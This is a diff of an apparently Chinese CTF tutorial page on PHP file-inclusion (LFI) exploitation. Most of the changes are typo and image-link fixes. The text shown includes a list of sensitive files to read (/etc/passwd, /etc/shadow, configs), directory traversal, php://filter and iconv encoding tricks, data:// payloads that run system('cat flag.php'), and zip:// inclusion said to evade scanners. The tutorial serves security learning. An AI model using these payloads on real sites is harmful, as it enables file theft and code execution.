@@ -54,17 +54,17 @@
     
       <link rel="stylesheet" href="../../../../../assets/document_dates/fonts/material-icons.css">
     
-      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/light.css">
-    
-      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/material.css">
-    
-      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/backdrop.css">
-    
-      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/shift-away.css">
+      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/tippy.css">
     
       <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/scale.css">
     
-      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/tippy.css">
+      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/material.css">
+    
+      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/shift-away.css">
+    
+      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/light.css">
+    
+      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/backdrop.css">
     
       <link rel="stylesheet" href="../../../../../assets/document_dates/core/core.css">
     
@@ -1080,7 +1080,7 @@
           <li class="md-nav__item">
   <a href="#21" class="md-nav__link">
     <span class="md-ellipsis">
-      2.1
+      2.1 本地敏感信息读取
     </span>
   </a>
   
@@ -1862,7 +1862,7 @@
           <li class="md-nav__item">
   <a href="#21" class="md-nav__link">
     <span class="md-ellipsis">
-      2.1
+      2.1 本地敏感信息读取
     </span>
   </a>
   
@@ -2058,13 +2058,13 @@
 </span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a><span class="cp">?&gt;</span>
 </span></code></pre></div></td></tr></table></div>
 <p>这时候我们去利用文件包含，通过include函数执行phpinfo.php页面</p>
-<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260316233248652.png" alt="image-20260316233248652" style="zoom:80%;" /></p>
+<p><img src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/image-20260316233248652.png" alt="image-20260316233248652" style="zoom:80%;" /></p>
 <p>把文件名改为jpg,发现依然可以解析。</p>
-<p><img alt="image-20260316235611119" src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260316235611119.png" /></p>
+<p><img alt="image-20260316235611119" src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/image-20260316235611119.png" /></p>
 <p>可以看出，include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来。</p>
 <p>而在文件上传中，我们上传了jpg格式的一句话木马，如果有文件包含漏洞jpg文件就可以当作php文件解析，所以文件上传通常配合文件包含一起使用。</p>
 <h2 id="_3">二.关于文件路径<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
-<h3 id="21">2.1<a class="headerlink" href="#21" title="Permanent link">&para;</a></h3>
+<h3 id="21">2.1 本地敏感信息读取<a class="headerlink" href="#21" title="Permanent link">&para;</a></h3>
 <p>通过文件包含漏洞我们可以读取本地的一些敏感信息</p>
 <p>以本地靶场为例</p>
 <p>我们创建一个php文件</p>
@@ -2078,7 +2078,7 @@
 </span></code></pre></div></td></tr></table></div>
 <p>利用文件包含漏洞我们可以获取系统本地的一些敏感信息</p>
 <p>例如:<code>C:\Windows\system.ini</code>文件。</p>
-<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260317161151018.png" alt="image-20260317161151018" style="zoom:80%;" /></p>
+<p><img src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/image-20260317161151018.png" alt="image-20260317161151018" style="zoom:80%;" /></p>
 <p>这里就涉及了相对路径和绝对路径的问题</p>
 <h3 id="22">2.2绝对路径与相对路径<a class="headerlink" href="#22" title="Permanent link">&para;</a></h3>
 <p><strong>绝对路径：</strong>是指从文件系统的根目录开始，完整描述文件或目录位置的一种路径表示方法。</p>
@@ -2087,24 +2087,24 @@
 <p>这里值得一提的是可以通过./表示当前目录位置，../表示上一级路径位置</p>
 <p>通过相对路径我们可以做到访问一些关键文件。</p>
 <p>举例：BUUCTF exer</p>
-<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260317203558498.png" alt="image-20260317203558498" style="zoom:80%;" /></p>
+<p><img src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/image-20260317203558498.png" alt="image-20260317203558498" style="zoom:80%;" /></p>
 <p>当我们知道根目录下有文件但是无法知晓其绝对路径时，相对路径可以通过不断返回上一级路径进行目录穿越来进行读取。</p>
-<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260317203848406.png" alt="image-20260317203848406" style="zoom:80%;" /></p>
+<p><img src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/image-20260317203848406.png" alt="image-20260317203848406" style="zoom:80%;" /></p>
 <h3 id="23">2.3 常见敏感目录信息<a class="headerlink" href="#23" title="Permanent link">&para;</a></h3>
-<p>这里只展示liunx的，windows的出现很少</p>
+<p>这里只展示linux的，windows的出现很少</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span>
 <span class="normal"><a href="#__codelineno-11-2">2</a></span>
 <span class="normal"><a href="#__codelineno-11-3">3</a></span>
 <span class="normal"><a href="#__codelineno-11-4">4</a></span>
 <span class="normal"><a href="#__codelineno-11-5">5</a></span>
 <span class="normal"><a href="#__codelineno-11-6">6</a></span>
-<span class="normal"><a href="#__codelineno-11-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>/etc/password //账户信息
+<span class="normal"><a href="#__codelineno-11-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>/etc/passwd //账户信息
 </span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2"></a>/etc/shadow //账户密码信息
 </span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3"></a>/usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件
 </span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4"></a>/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置
 </span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5"></a>/usr/local/app/php5/lib/php.ini //PHP相关配置
 </span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6"></a>/etc/httpd/conf/httpd.conf //Apache配置文件
-</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7"></a>/etc/my.conf //mysql配置文件
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7"></a>/etc/my.cnf //mysql配置文件
 </span></code></pre></div></td></tr></table></div>
 <h2 id="lfi">三.LFI漏洞利用<a class="headerlink" href="#lfi" title="Permanent link">&para;</a></h2>
 <h3 id="31">3.1文件包含协议<a class="headerlink" href="#31" title="Permanent link">&para;</a></h3>
@@ -2174,7 +2174,7 @@
 </tr>
 </tbody>
 </table>
-<p><strong>用法</strong> ：（一下来自crfshow的各题payload）</p>
+<p><strong>用法</strong> ：（以下来自 ctfshow 的各题 payload）</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1"> 1</a></span>
 <span class="normal"><a href="#__codelineno-19-2"> 2</a></span>
 <span class="normal"><a href="#__codelineno-19-3"> 3</a></span>
@@ -2248,11 +2248,11 @@
 <span class="normal"><a href="#__codelineno-21-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a><span class="cp">&lt;?php</span> 
 </span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2"></a><span class="k">echo</span> <span class="nb">iconv</span><span class="p">(</span><span class="s2">&quot;UCS-2LE&quot;</span><span class="p">,</span><span class="s2">&quot;UCS-2BE&quot;</span><span class="p">,</span><span class="s1">&#39;&lt;?php system(&quot;cat fl*&quot;);&#39;</span><span class="p">);</span>
 </span></code></pre></div></td></tr></table></div>
-<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260318220603745.png" alt="image-20260318220603745" style="zoom:80%;" /></p>
+<p><img src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/image-20260318220603745.png" alt="image-20260318220603745" style="zoom:80%;" /></p>
 <p>输出</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1"></a>?&lt;hp pystsme&quot;(ac tlf&quot;*;)
 </span></code></pre></div></td></tr></table></div>
-<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260318220838541.png" alt="image-20260318220838541" style="zoom:80%;" /></p>
+<p><img src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/image-20260318220838541.png" alt="image-20260318220838541" style="zoom:80%;" /></p>
 <p>这是<?php die();?>会被转换的样子。也就意味着其不会被识别执行</p>
 <p>payload:</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1">1</a></span>
@@ -2260,7 +2260,7 @@
 </span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2"></a>POST: contents=?&lt;hp pystsme&quot;(ac tlf&quot;*;)
 </span></code></pre></div></td></tr></table></div>
 <p>然后访问1.php我们就能看见flag了</p>
-<p>这里base63和rot13的思路也是一样的通过编码协议去过滤我们不想要的东西，或者是通过编码来让文件不被执行从而读取其中变量或是获取源码等等</p>
+<p>这里base64和rot13的思路也是一样的通过编码协议去过滤我们不想要的东西，或者是通过编码来让文件不被执行从而读取其中变量或是获取源码等等</p>
 <p>补充：我们可以利用 <code>php://filter</code> 伪协议来读取文件内容，需要注意的是，<code>php://filter</code> 伪协议如果不指定过滤器的话，默认会解析 PHP 代码（这里其实从原理上就是include等函数最后总是会执行文件的如果没有编码就意味着它拥有完整可执行的php代码），所以我们需要指定 <code>convert.base64-encode</code> 过滤器来对文件内容进行编码</p>
 <h4 id="313data">3.1.3data://协议<a class="headerlink" href="#313data" title="Permanent link">&para;</a></h4>
 <p><strong>条件</strong>：</p>
@@ -2322,11 +2322,11 @@
 <p>payload:</p>
 <div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-26-1">1</a></span>
 <span class="normal"><a href="#__codelineno-26-2">2</a></span>
-<span class="normal"><a href="#__codelineno-26-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1"></a><span class="x">data://test/plain,</span><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">&#39;cat flag.php&#39;</span><span class="p">);</span>
+<span class="normal"><a href="#__codelineno-26-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1"></a><span class="x">data://text/plain,</span><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">&#39;cat flag.php&#39;</span><span class="p">);</span>
 </span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2"></a><span class="nx">有过滤使用编码绕过</span>
 </span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3"></a><span class="nx">data</span><span class="o">://</span><span class="nx">text</span><span class="o">/</span><span class="nx">plain</span><span class="p">;</span><span class="nx">base64</span><span class="p">,</span><span class="nx">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs</span><span class="o">=</span>
 </span></code></pre></div></td></tr></table></div>
-<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260318235600054.png" alt="image-20260318235600054" style="zoom:80%;" /></p>
+<p><img src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/image-20260318235600054.png" alt="image-20260318235600054" style="zoom:80%;" /></p>
 <h4 id="314-zip">3.1.4 ZIP://协议（由于其需要绝对路径传入所以应用不广）<a class="headerlink" href="#314-zip" title="Permanent link">&para;</a></h4>
 <p><strong>条件</strong>：</p>
 <p>allow_url_fopen ：off/on</p>
@@ -2341,7 +2341,7 @@
 <div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-27-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1"></a>zip://[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\1.zip%23phpinfo.txt
 </span></code></pre></div></td></tr></table></div>
 <p>这里恶意代码被压缩，安全软件扫描时看到的是压缩数据，不是明文PHP代码，可能绕过检测。</p>
-<div class='document-dates-plugin-wrapper document-dates-bottom'><div class='document-dates-plugin' locale=''><span data-tippy-content data-tippy-raw='2026-03-16'><span class='material-icons' data-icon='doc_created'></span><time datetime='2026-03-16T16:01:36'>2026-03-16 16:01:36</time></span><span data-tippy-content data-tippy-raw='2026-03-20'><span class='material-icons' data-icon='doc_modified'></span><time datetime='2026-03-20T21:02:42+08:00'>2026-03-20 21:02:42</time></span></div></div>
+<div class='document-dates-plugin-wrapper document-dates-bottom'><div class='document-dates-plugin' locale=''><span data-tippy-content data-tippy-raw='2026-03-16'><span class='material-icons' data-icon='doc_created'></span><time datetime='2026-03-16T16:01:36'>2026-03-16 16:01:36</time></span><span data-tippy-content data-tippy-raw='2026-03-27'><span class='material-icons' data-icon='doc_modified'></span><time datetime='2026-03-27T21:06:31+08:00'>2026-03-27 21:06:31</time></span></div></div>
 
 
 
